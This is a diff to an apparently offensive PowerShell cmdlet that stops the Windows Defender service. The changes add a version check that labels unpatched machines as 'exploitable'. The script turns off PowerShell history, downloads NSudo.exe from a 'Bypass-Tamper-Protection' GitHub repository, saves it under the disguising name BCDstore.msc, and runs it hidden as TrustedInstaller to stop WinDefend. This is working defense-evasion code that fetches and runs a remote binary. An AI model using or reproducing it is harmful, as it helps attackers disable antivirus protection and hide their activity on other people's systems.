@@ -3,18 +3,19 @@
    Disable Windows Defender Service (WinDefend) 
 
    Author: @M2Team|@r00t-3xp10it
-   Tested Under: Windows 10 (18363) x64 bits
-   Required Dependencies: admin privileges
+   Tested Under: Windows 10 (19042) x64 bits
+   Required Dependencies: administrator privileges
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.2
+   PS cmdlet Dev version: v1.2.4
 
 .DESCRIPTION
    This CmdLet Query, Stops, Start Anti-Virus Windows Defender
    service without the need to restart or refresh target machine.
 
 .NOTES
-   Mandatory requirements: $ Administrator privileges $
+   Mandatory requirements: Administrator privileges
    Remark: Windows warns users that WinDefend is stopped!
+   Remark: Defender versions less than 4.18.2104.14 are vulnerable!
 
 .Parameter Action
    Accepts arguments: Query, Stop and Start
@@ -39,7 +40,7 @@
 
 .EXAMPLE
    PS C:\> .\DisableDefender.ps1 -Action Stop -ServiceName "WinDefend"
-   Manual Input of Windows Defender Service Name (query: cmd /c sc query)
+   Manual Input of Windows Defender Service Name (default: WinDefend)
 
 .EXAMPLE
    PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 3
@@ -54,7 +55,8 @@
    ServiceName      : WinDefend
    StartType        : Automatic
    CurrentStatus    : Stopped
-   ManualQuery      : Get-Service -Name WinDefend
+   AMRversion       : 4.15.1334.66
+   IsExploitable?   : True  => Admin privs!
 #>
 
 
@@ -71,6 +73,7 @@ Write-Host ""
 Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
 ## Local variable declarations { Cmdlet Internal Settings }
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
+$Patched = (Get-MpComputerStatus -EA SilentlyContinue).AMProductVersion
 If($Delay -lt 2 -or $Delay -gt 6){[int]$Delay='2'} ## min\max delay value accepted
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 
@@ -95,8 +98,8 @@ If($Action -ieq "Query"){## Query Windows Defender state
       StartType        : Automatic
       CanStop          : True
       CurrentStatus    : Running
-      IsExploitable?   : True  => running under Admin privs!
-      ManualQuery      : Get-Service -Name WinDefend
+      AMRversion       : 4.18.2104.14
+      IsExploitable?   : True  => Admin privs!
    #>
 
    ## Local function variable declarations
@@ -119,13 +122,34 @@ If($Action -ieq "Query"){## Query Windows Defender state
    ## Query for module exploitation state
    If($IsClientAdmin -ieq "True"){## Administrator privileges
 
-       $Exploitable = "True  => running under Admin privs!"
+      ## Query AMRversion (patched versions)
+      If($Patched -ge '4.18.2104.14'){
+
+          ## AMRversion: 4.18.2104.14
+          $Exploitable = "False  => Patched version!"
+
+       }Else{
+       
+          $Exploitable = "True  => Admin privs!"
+
+       }
 
    }Else{## NOT exploitable under current shell privileges!
 
-       $Exploitable = "False => Admin privileges required!"
+      ## Query AMRversion (patched versions)
+      If($Patched -ge '4.18.2104.14'){
+
+          ## AMRversion: 4.18.2104.14
+          $Exploitable = "False  => Patched version!"
+
+       }Else{
+       
+          $Exploitable = "False => Admin privs required!"
+
+       }
 
    }
+
 
    ## Build Output Table
    If($State -ieq "not found!"){$Exploitable = "`$null"}
@@ -135,8 +159,8 @@ If($Action -ieq "Query"){## Query Windows Defender state
    echo "StartType        : $stype" >> $Env:TMP\qwerty.log
    echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
    echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
+   echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
    echo "IsExploitable?   : $Exploitable" >> $Env:TMP\qwerty.log
-   echo "ManualQuery      : Get-Service -Name $ServiceName" >> $Env:TMP\qwerty.log
    echo "" >> $Env:TMP\qwerty.log
    Get-Content -Path "$Env:TMP\qwerty.log"
 
@@ -165,6 +189,16 @@ If($Action -ieq "Query"){## Query Windows Defender state
       PS C:\> .\DisableDefender.ps1 -Action Stop -ServiceName WinDefend
    #>
 
+
+   ## Query AMRversion (patched versions)
+   If($Patched -ge '4.18.2104.14'){
+
+      Write-Host "[error] WinDefend version ($Patched) its allready patched!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";exit ## Exit @DisableDefender
+
+   }
+
+
    If($IsClientAdmin -ieq "True"){## Shell running under Admin privileges
 
       ## Download standalone binary from @swagkarna github repository
@@ -172,7 +206,8 @@ If($Action -ieq "Query"){## Query Windows Defender state
       powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe','$Env:TMP\BCDstore.msc') }"
       If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){
 
-         cd $Env:TMP;.\BCDstore.msc -U:T -Wait -ShowWindowMode:Hide sc stop $ServiceName
+         cd $Env:TMP
+         .\BCDstore.msc -U:T -Wait -ShowWindowMode:Hide sc stop $ServiceName
          cd $Working_Directory ## Return to @redpill working directory
 
       }Else{## [error] failed to download Nsudo.exe {Masquerade of: BCDstore.msc}
